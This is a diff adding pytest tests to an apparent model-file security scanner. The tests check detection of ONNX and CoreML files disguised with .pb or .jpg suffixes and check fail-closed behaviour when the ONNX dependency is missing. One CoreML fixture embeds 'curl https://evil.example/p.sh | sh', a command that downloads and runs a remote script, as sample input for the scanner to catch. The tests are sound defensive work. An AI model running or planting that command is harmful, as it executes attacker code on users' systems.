@@ -1937,6 +1937,56 @@ def test_scan_file_detects_malicious_group_budget_exhausted_renamed_onnx(tmp_pat
     )
 
 
+def test_scan_file_detects_malicious_budget_exhausted_onnx_with_protobuf_suffix(tmp_path: Path) -> None:
+    pytest.importorskip("onnx")
+    disguised_onnx = create_mock_onnx(tmp_path / "many-prefixes.pb", op_type="PythonOp")
+    prefix_mock_onnx_with_unknown_field(disguised_onnx, value_size=0, count=4097, field_number=8)
+
+    result = scan_file(str(disguised_onnx), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "onnx"
+    assert result.success is False
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and issue.details.get("op_type") == "PythonOp"
+        for issue in result.issues
+    )
+
+
+def test_scan_file_analyzes_coreml_candidate_when_onnx_dependency_is_unavailable(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    disguised_coreml = create_mock_coreml(
+        tmp_path / "candidate.jpg",
+        custom_class="EvilRuntimeLayer",
+        custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+    )
+    disguised_coreml.write_bytes((b"\x9a\x06\x00" * 4097) + disguised_coreml.read_bytes())
+    monkeypatch.setattr("modelaudit.scanners.onnx_scanner._check_onnx", lambda: False)
+
+    result = scan_file(str(disguised_coreml), config={"cache_enabled": False})
+
+    assert result.scanner_name == "coreml"
+    assert result.success is False
+    assert any("Custom CoreML layer detected" in issue.message for issue in result.issues)
+
+
+def test_scan_file_unresolved_candidate_without_onnx_dependency_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    candidate = tmp_path / "candidate.jpg"
+    candidate.write_bytes(b"\x42\x00" * 4097)
+    monkeypatch.setattr("modelaudit.scanners.onnx_scanner._check_onnx", lambda: False)
+
+    result = scan_file(str(candidate), config={"cache_enabled": False})
+
+    assert result.scanner_name == "unknown"
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == "inconclusive"
+    assert "onnx_tentative_candidate_analysis_unavailable" in result.metadata["scan_outcome_reasons"]
+
+
 def test_scan_file_rejects_budget_exhausted_protobuf_without_onnx_structure_cleanly(tmp_path: Path) -> None:
     pytest.importorskip("onnx")
     ambiguous_onnx = tmp_path / "ambiguous.jpg"
